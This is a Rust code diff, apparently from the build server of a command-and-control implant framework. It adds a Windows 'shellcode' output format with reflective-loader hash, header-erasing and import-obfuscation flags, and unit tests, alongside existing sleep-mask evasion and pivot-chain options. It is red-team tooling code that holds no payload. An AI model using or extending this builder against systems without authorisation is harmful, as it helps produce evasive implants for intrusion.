@@ -57,6 +57,15 @@ pub struct BuildRequest {
     /// completes. Use this to pre-wire multi-hop pivot chains at build
     /// time. Omit (or set null) for direct-connect agents and leaf nodes.
     #[serde(default)]                            pub auto_pivot_port:   Option<u16>,
+    // ── Shellcode (format = "shellcode") ──────────────────────────────
+    /// ROR13 export hash for the reflective loader ("0x10" = none).
+    #[serde(default = "default_sc_hash")]        pub sc_hash:           String,
+    /// User-data blob appended to the shellcode.
+    #[serde(default = "default_sc_userdata")]    pub sc_userdata:       String,
+    /// Loader flags (bit0: erase headers, bit1: obfuscate imports).
+    #[serde(default)]                            pub sc_flags:          u32,
+    /// On-disk encoding: bin | b64 | c | hex.
+    #[serde(default = "default_sc_output")]      pub sc_output:         String,
 }
 
 fn default_platform()   -> String { "linux".into() }
@@ -68,6 +77,9 @@ fn default_jmin()       -> u32   { 20 }
 fn default_jmax()       -> u32   { 10 }
 fn default_sleep_mask() -> String { "ekko".into() }
 fn default_true()       -> bool  { true }
+fn default_sc_hash()    -> String { "0x10".into() }
+fn default_sc_userdata()-> String { "None".into() }
+fn default_sc_output()  -> String { "bin".into() }
 
 #[derive(Serialize)]
 pub struct BuildStarted { pub job_id: String }
@@ -112,8 +124,25 @@ fn validate_request(req: &BuildRequest) -> Result<(), String> {
         o => return Err(format!("invalid profile: {}", o)),
     }
     match req.format.as_str() {
-        "exe" | "dll" | "service" | "stager" => {}
+        "exe" | "dll" | "service" | "stager" | "shellcode" => {}
         o => return Err(format!("invalid format: {}", o)),
+    }
+    if req.format == "shellcode" {
+        if req.platform != "windows" {
+            return Err("format=shellcode requires platform=windows".into());
+        }
+        match req.sc_output.as_str() {
+            "bin" | "b64" | "c" | "hex" => {}
+            o => return Err(format!("invalid sc_output: {}", o)),
+        }
+        // Must parse as decimal or 0x-hex u32
+        let h = req.sc_hash.trim();
+        let parsed = h.strip_prefix("0x").or_else(|| h.strip_prefix("0X"))
+            .map(|x| u32::from_str_radix(x, 16))
+            .unwrap_or_else(|| h.parse::<u32>());
+        if parsed.is_err() {
+            return Err(format!("invalid sc_hash: {}", req.sc_hash));
+        }
     }
     match req.sleep_mask.as_str() {
         "none" | "ekko" | "foliage" => {}
@@ -181,6 +210,13 @@ pub fn build_args(req: &BuildRequest) -> Vec<String> {
     if let Some(port) = req.auto_pivot_port {
         args.push("--auto-pivot-port".into());
         args.push(port.to_string());
+    }
+    // Shellcode options — only meaningful (and only accepted) for that format
+    if req.format == "shellcode" {
+        args.extend(["--sc-hash".into(),     req.sc_hash.clone()]);
+        args.extend(["--sc-userdata".into(), req.sc_userdata.clone()]);
+        args.extend(["--sc-flags".into(),    req.sc_flags.to_string()]);
+        args.extend(["--sc-output".into(),   req.sc_output.clone()]);
     }
     args
 }
@@ -444,6 +480,10 @@ mod tests {
             guard_hour_end:    0,
             guard_no_system:   false,
             auto_pivot_port:   None,
+            sc_hash:           "0x10".into(),
+            sc_userdata:       "None".into(),
+            sc_flags:          0,
+            sc_output:         "bin".into(),
         }
     }
 
@@ -508,6 +548,49 @@ mod tests {
             let mut r = base_req(); r.format = f.into();
             assert!(validate_request(&r).is_ok(), "format={f}");
         }
+    }
+
+    #[test]
+    fn validate_ok_shellcode_format_windows() {
+        let mut r = base_req();
+        r.format = "shellcode".into();
+        r.platform = "windows".into();
+        assert!(validate_request(&r).is_ok());
+    }
+
+    #[test]
+    fn validate_err_shellcode_non_windows() {
+        let mut r = base_req();
+        r.format = "shellcode".into();
+        r.platform = "linux".into();
+        assert!(validate_request(&r).unwrap_err().contains("platform=windows"));
+    }
+
+    #[test]
+    fn validate_err_shellcode_bad_output() {
+        let mut r = base_req();
+        r.format = "shellcode".into();
+        r.platform = "windows".into();
+        r.sc_output = "pdf".into();
+        assert!(validate_request(&r).unwrap_err().contains("sc_output"));
+    }
+
+    #[test]
+    fn validate_err_shellcode_bad_hash() {
+        let mut r = base_req();
+        r.format = "shellcode".into();
+        r.platform = "windows".into();
+        r.sc_hash = "0xZZZ".into();
+        assert!(validate_request(&r).unwrap_err().contains("sc_hash"));
+    }
+
+    #[test]
+    fn validate_ok_shellcode_decimal_hash() {
+        let mut r = base_req();
+        r.format = "shellcode".into();
+        r.platform = "windows".into();
+        r.sc_hash = "3735928559".into(); // 0xDEADBEEF in decimal
+        assert!(validate_request(&r).is_ok());
     }
 
     #[test]
@@ -594,6 +677,29 @@ mod tests {
     fn args_transport_underscore_converted_to_dash() {
         let mut r = base_req(); r.transport = "tcp_plain".into();
         assert!(has_pair(&build_args(&r), "--transport", "tcp-plain"));
+    }
+
+    #[test]
+    fn args_shellcode_opts_appended_for_shellcode_format() {
+        let mut r = base_req();
+        r.format = "shellcode".into();
+        r.platform = "windows".into();
+        r.sc_hash = "0xDEADBEEF".into();
+        r.sc_userdata = "blob".into();
+        r.sc_flags = 1;
+        r.sc_output = "b64".into();
+        let a = build_args(&r);
+        assert!(has_pair(&a, "--format", "shellcode"));
+        assert!(has_pair(&a, "--sc-hash", "0xDEADBEEF"));
+        assert!(has_pair(&a, "--sc-userdata", "blob"));
+        assert!(has_pair(&a, "--sc-flags", "1"));
+        assert!(has_pair(&a, "--sc-output", "b64"));
+    }
+
+    #[test]
+    fn args_shellcode_opts_omitted_for_other_formats() {
+        let a = build_args(&base_req());
+        assert!(!a.iter().any(|x| x.starts_with("--sc-")));
     }
 
     #[test]
